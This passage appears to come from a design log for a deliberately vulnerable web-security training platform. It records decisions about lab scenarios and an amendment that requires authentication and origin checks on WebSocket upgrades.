**Controller (accepting the designer's recommendations):** Q5 IMDS-compatible paths under the fictional "Citadel Cloud"; Q6 SC-20 `unserialize` runs inside E4's QuickJS sandbox (E4 is on master); Q7 separate `core/xmldtd/` parser (never feeds the XSS oracle); Q8 victim-panel net extensions (`VictimConfig.net`, `/sim/` reserved routes, `simWorld({ inbox: false })`); Q9 attacker-log `from: browser|server|dns` + capped headers; Q10 SC-12 retitled "Path traversal via Unicode normalisation" (update `src/catalog.ts` + the plan table in the batch that builds it); Q11 `POST <lab>/ws/frames` HTTP fallback; Q12 TEST-NETs as the simulated internet; Q13 custom media type for raw webhook bodies; Q14 keep the 96 MiB budget + run the ledger review; Q15 move `mountIntents`/`refusal`/`success`/`endpointsOf` to `src/districts/_shared/intents.ts` (re-exported from relic-market); Q16 no GraphiQL, a JSON request console; Q17 AR-01 seal per level accepted; Q18 no global header changes.

## Amendment after the platform-login review (2026-11-18, binding for E8)

The platform login (`hvwa_auth`, on by default in the Docker image) is enforced by Express middleware, but the Node `upgrade` event bypasses Express entirely. E8's upgrade listener MUST: re-apply the Host guard; require the EXACT same origin (`Origin` equal to the app's own origin — same-site pages on other loopback ports carry Lax cookies); validate `hvwa_auth` through the auth service's `session()` exactly as the HTTP gate does (no token → refuse the handshake, 401); and close the lab's sockets on logout, password change and token idle/absolute expiry. The HTTP fallback `POST <lab>/ws/frames` is behind the normal gate already.
